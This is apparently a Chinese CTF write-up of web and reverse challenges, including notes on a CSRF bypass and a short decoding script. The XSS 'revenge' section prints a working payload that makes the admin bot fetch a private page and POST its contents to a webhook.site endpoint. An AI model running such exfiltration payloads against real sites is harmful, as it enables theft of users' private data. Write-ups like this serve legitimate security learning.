# web
### BABY DUCKY NOTES
理清楚路由即可,
`post/view/<name>`可以访问这个用户的post内容,在`database.db`里可以看到flag是放在了admin下
,签到题,直接访问admin的post即可
### BABY DUCKY NOTES: REVENGE
#xss 
根据名字也知道是上一题的升级版
使用winmerge对比一下两道题附件,基本一致,但是revenge题目设置了hidden属性
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230728204549.png)

那就需要用到bot来帮我们读取flag了,那就是xss了

---
本地都打到了,怎么bot不行,还好试出来了
*payload*
```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://localhost:1337/posts/view/admin', true);
xhr.onreadystatechange = function() {
    var sourceCode = xhr.responseText;
    // 在这里处理获取到的网站源代码
    var data = "sourceCode=" + encodeURIComponent(sourceCode); // 定义data变量
    var xhr2 = new XMLHttpRequest(); // 创建新的XMLHttpRequest对象
    var url = "https://webhook.site/0f4d9c2a-3099-44f4-a220-ad03ee9c92dd"; // 将URL设置为您的服务器端点
    xhr2.open("POST", url);
    xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr2.onload = function() {
      if (xhr2.status === 200) {
        console.log(xhr2.responseText);
      }
      else {
        console.log("请求失败");
      }
    };
    xhr2.send(data); // 将数据发送到服务器
};
xhr.send();
```
### COOKIE STORE
一个可以自定义模板,并且能分享给其他人的网站
提交的模板会存储的session里,并且使用`csrf_token`防止越权
![image](https://i.imgur.com/YyII7ml.png)
我们可以操作bot向指定fields写入FLAG内容,
```python
    client.get(f"http://localhost:1337/form_builder?fields={fields}")

    time.sleep(2)
    try:
        client.find_element(By.ID, "title").send_keys(FLAG)
    except:
        pass
    client.execute_script("""document.querySelector('input[type="submit"]').click();""")
    time.sleep(2)
```
也就是我们需要通过`csrf_token`来越权

# reverse
### PASS
热身题
```python
string="PziP97vkc5sA6oJM0KwWEnQX2OFaH0nAFTuS42myr31GYbJIfBSdAFWsLpx8N0v4PzO7aIVQaHrVq6AW8c1K5ZyFXzMeRAOiJ2nWXYy2Pj7x96RzkcA3\
inNqlDOBLKZ4rNFYGTn0Cl5U9aX2WIH1cOyIbm2AZ0k31u7FrxBECKPpMhYVUyvA5LfgXcW9eDSMTBlsorR22laXN3e8<qSCmwK0Do9bJzYvd5YgG3dR\
BhwMvOp2qS08UWQKtLQbphJTXLd2~fktr45ES7OK3x0yNqu1XSC9nA`rGpBvQlbDktjIxLm2KlVYnXw0mpt5aOe8B4grGXFe06gaZv3PYdpS4CDquJnm\
kR1Mn6sKScF3vV7pdzYfTkBRbqGbzu2wtPHkXsx1pK14ojTfJYIe0PpU1TjDKaW85uZ2mlFHYMSEkBvKo6WIdTnVRewMPk|3pU1SjNErN7s0HYlp9tMq\
AmBh0dXD4VaK8NZWU1fnrsQaEc5Bht09eHwxDSpWj0ahd5rtIzyKETxUq9CkXC8DAP37Kc1UqOvdb2GT0Yvxuh1grzfdR4JiVpo83QOEWlL2<Bt9Xm7Q\
5RNkljfOZogB8ctIzyra9wF0RKycTJjvZfDlm6o75QsG`2laXN3e85qSCmwK0Do9bJzYvdZE6"

for i in range(0,len(string),26):
    if(ord(string[i])==90):
        print(chr(123),end='')
    else:
        print(chr((ord(string[i])^0xB)-7),end='')


```


### PROCESS-MONITOR
给了三个文件,`ProcessMonitor.inf`,`ProcessMonitor.cat`,`ProcessMonitor.sys`
sys是驱动程序,需要re

# pwn

# crypto

# Misc


---
# *相关wp*




2023-07-28   20:19